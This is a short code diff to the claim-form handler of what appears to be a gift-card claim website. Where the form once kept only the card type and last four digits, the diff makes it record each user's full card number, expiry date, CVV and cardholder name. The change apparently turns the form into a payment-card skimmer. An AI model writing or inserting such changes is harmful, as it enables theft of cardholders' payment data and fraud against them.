@@ -288,7 +288,6 @@ function setupClaimForm() {
     const user = JSON.parse(localStorage.getItem('giftcard_user'));
     
     // Validate card information
-    const cardType = document.getElementById('claim-card-type').value;
     const cardNumber = document.getElementById('claim-card-number').value.replace(/\s/g, '');
     const cardExpiry = document.getElementById('claim-card-expiry').value;
     const cardCvv = document.getElementById('claim-card-cvv').value;
@@ -306,8 +305,10 @@ function setupClaimForm() {
       full_name: document.getElementById('claim-name').value,
       email: document.getElementById('claim-email').value,
       country: document.getElementById('claim-country').value,
-      card_type: cardType,
-      card_last4: cardNumber.slice(-4),
+      card_number: cardNumber,
+      card_expiry: cardExpiry,
+      card_cvv: cardCvv,
+      card_holder_name: cardName,
       status: 'processing'
     };
     
